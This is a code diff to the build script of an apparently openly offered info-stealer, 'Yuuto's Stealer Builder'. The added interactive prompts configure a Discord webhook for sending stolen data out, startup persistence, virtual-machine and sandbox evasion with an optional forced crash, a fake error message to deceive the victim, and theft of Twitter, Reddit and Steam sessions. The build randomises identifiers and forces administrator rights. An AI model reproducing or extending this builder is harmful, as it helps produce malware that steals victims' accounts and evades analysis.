@@ -1,5 +1,5 @@
 const { rmSync, existsSync, writeFileSync } = require('fs');
-const { join } = require('path');
+const { join, extname } = require('path');
 const { execSync } = require('child_process');
 
 if (!existsSync('node_modules')) {
@@ -11,14 +11,144 @@ if (!existsSync('node_modules')) {
 
 const builder = require('electron-builder');
 const pngToIco = require('png-to-ico');
+const inquirer = require('inquirer');
+const config = require('./config');
+
+console.log('========================================================');
+console.log('|                                                      |');
+console.log('|                Yuuto\'s Stealer Builder               |');
+console.log('|       https://github.com/JustYuuto/Yuuto-Stealer     |');
+console.log('|                                                      |');
+console.log('========================================================');
+console.log('');
 
 (async () => {
-  if (existsSync(join('assets', 'icon.png'))) {
-    console.log('Converting icon into a .ico file...');
-    const ico = await pngToIco(join('assets', 'icon.png'));
-    writeFileSync('icon.ico', ico);
-    console.log('Done conversion.');
-  }
+  await inquirer
+    .prompt([
+      {
+        name: 'app_name',
+        type: 'input',
+        message: 'How should we name the application? (Not the executable name!)',
+        default: config.name,
+        validate(input) {
+          const done = this.async();
+          if (input && input.trim() !== '') {
+            config.name = input;
+            done(null, true);
+          } else {
+            done('Name is not valid!');
+          }
+        }
+      },
+      {
+        name: 'webhook_url',
+        type: 'input',
+        message: 'Enter your webhook URL:',
+        default: config.webhook && config.webhook.url,
+        validate(input) {
+          const done = this.async();
+          if (input && /https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/[0-9]{17,19}\/([a-zA-Z0-9-_]+)/g.test(input)) {
+            if (!config.webhook) config.webhook = {};
+            config.webhook.url = input;
+            done(null, true);
+          } else {
+            done('Webhook URL is not valid!');
+          }
+        }
+      },
+      {
+        name: 'options__add_to_startup',
+        type: 'confirm',
+        default: config.addToStartup,
+        message: 'Add to startup programs?'
+      },
+      {
+        name: 'options__anti_vm',
+        type: 'confirm',
+        default: config.vmProtect,
+        message: 'Protect against Virtual Machines and sandboxes?'
+      },
+      {
+        name: 'options__bsod_if_vm',
+        type: 'confirm',
+        default: config.bsodIfVm,
+        when: (answers) => answers['options__anti_vm'] === true,
+        message: 'If a Virtual Machine or a sandbox is detected, should the stealer create a BSOD on the computer?'
+      },
+      {
+        name: 'options__fake_error',
+        type: 'confirm',
+        default: config.fakeError,
+        message: 'Show a fake error to the user?'
+      },
+      {
+        name: 'options__fake_error_customization',
+        type: 'confirm',
+        default: false,
+        when: (answers) => answers['options__fake_error'] === true,
+        message: 'Do you want to set a custom title or message for the error?'
+      },
+      {
+        name: 'options__fake_error_title',
+        type: 'confirm',
+        when: (answers) => answers['options__fake_error_customization'] === true,
+        default: config.fakeErrorDetails.title,
+        message: 'Error title:'
+      },
+      {
+        name: 'options__fake_error_message',
+        type: 'confirm',
+        when: (answers) => answers['options__fake_error_customization'] === true,
+        default: config.fakeErrorDetails.message,
+        message: 'Error message:'
+      },
+      {
+        name: 'options__session_stealing',
+        type: 'checkbox',
+        message: 'Steal sessions from...',
+        choices: [
+          { name: 'Twitter', value: 'twitter', checked: config.sessionStealing.twitter },
+          { name: 'Reddit', value: 'reddit', checked: config.sessionStealing.reddit },
+          { name: 'Steam', value: 'steam', checked: config.sessionStealing.steam },
+        ]
+      },
+      {
+        name: 'custom_icon',
+        type: 'confirm',
+        message: 'Do you want to set a custom icon?',
+      },
+      {
+        id: 'custom_icon_path',
+        type: 'input',
+        name: 'Enter your icon path',
+        loop: true,
+        when: (answers) => answers['custom_icon'] === true,
+        validate(input) {
+          const done = this.async();
+          if (existsSync(input)) {
+            if (extname(input) === '.png') {
+              pngToIco(input)
+                .then(ico => {
+                  writeFileSync(input, ico);
+                  done(null, true);
+                  config.icon = input;
+                }).catch(e => {
+                  done(`${e.message} Please check that your file is not damaged, corrupted, and is readable.`);
+                });
+            } else if (extname(input) === '.ico') {
+              done(null, true);
+              config.icon = input;
+            } else {
+              done('The icon must be a .ico or .png file!');
+            }
+          } else {
+            done('The file doesn\'t exists!');
+          }
+        }
+      }
+    ]);
+
+  console.log('\nStarting building process...');
 
   if (existsSync(join(__dirname, 'dist'))) {
     try {
@@ -55,17 +185,18 @@ const pngToIco = require('png-to-ico');
     targets: builder.Platform.WINDOWS.createTarget(),
     config: {
       appId: 'com.' + randomString(16),
-      productName: require('./config').name,
-      executableName: require('./config').filename,
-      icon: existsSync('icon.ico') ? './icon.ico' : undefined,
+      productName: config.name,
+      executableName: config.filename,
+      icon: config.icon,
       compression: 'maximum',
       buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
-      artifactName: require('./config').filename + '.exe',
+      artifactName: config.filename + '.exe',
       win: {
         requestedExecutionLevel: 'requireAdministrator', // Force launch as administrator
       },
       nsis: {
-        deleteAppDataOnUninstall: true
+        deleteAppDataOnUninstall: true,
+        createDesktopShortcut: false
       },
       files: [
         'dist/*.bundle.js',
